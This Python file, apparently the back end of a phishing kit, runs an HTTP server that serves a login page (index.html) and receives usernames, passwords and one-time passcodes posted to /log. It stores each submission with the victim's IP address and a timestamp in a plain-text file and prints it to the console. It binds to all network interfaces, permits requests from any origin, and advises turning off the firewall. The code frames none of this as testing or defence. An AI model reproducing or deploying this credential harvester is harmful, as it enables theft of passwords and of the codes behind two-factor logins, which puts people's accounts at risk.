# server.py - Updated with better network binding
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime
import os
import socket

LOG_FILE = "logs.txt"

# Get local IP address
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class LogHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/log':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                ip = self.client_address[0]
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                username = data.get('username', '')
                password = data.get('password', '')
                otp = data.get('otp', '')
                
                if otp:
                    log_entry = f"[{timestamp}] | IP: {ip} | Username: {username} | Password: {password} | OTP: {otp}\n"
                else:
                    log_entry = f"[{timestamp}] | IP: {ip} | Username: {username} | Password: {password}\n"
                
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(log_entry)
                
                print(f"✅ LOG SAVED: {log_entry.strip()}")
                
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': True, 
                    'ip': ip, 
                    'timestamp': timestamp
                }).encode())
                
            except Exception as e:
                print(f"❌ Error: {e}")
                self.send_response(500)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            try:
                with open('index.html', 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Replace localhost with actual IP
                    local_ip = get_local_ip()
                    content = content.replace('http://localhost:3000', f'http://{local_ip}:3000')
                    self.wfile.write(content.encode('utf-8'))
            except FileNotFoundError:
                self.wfile.write(b"<h1>index.html not found</h1>")
            except Exception as e:
                self.wfile.write(f"<h1>Error: {e}</h1>".encode())
        else:
            self.send_response(404)
            self.end_headers()

# Run server on port 3000
port = 3000
local_ip = get_local_ip()

print("=" * 60)
print(f"🚀 SERVER STARTED!")
print(f"")
print(f"📱 On your PHONE (same Wi-Fi):")
print(f"   http://{local_ip}:{port}")
print(f"")
print(f"💻 On this COMPUTER:")
print(f"   http://localhost:{port}")
print(f"")
print(f"📁 Logs saved to: {os.path.abspath(LOG_FILE)}")
print("=" * 60)
print(f"⚠️  If phone can't connect:")
print(f"   1. Check both devices are on SAME Wi-Fi")
print(f"   2. Disable Windows Firewall temporarily")
print(f"   3. Try using your phone's browser, not Chrome")
print("=" * 60)
print(f"Press Ctrl+C to stop the server")
print("=" * 60)

try:
    # Bind to all network interfaces (0.0.0.0)
    server = HTTPServer(("0.0.0.0", port), LogHandler)
    print(f"✅ Server is listening on all network interfaces")
    server.serve_forever()
except PermissionError:
    print(f"❌ Permission denied! Try running as Administrator")
except OSError as e:
    print(f"❌ Port {port} is already in use. Try changing the port number.")
except KeyboardInterrupt:
    print("\n👋 Server stopped")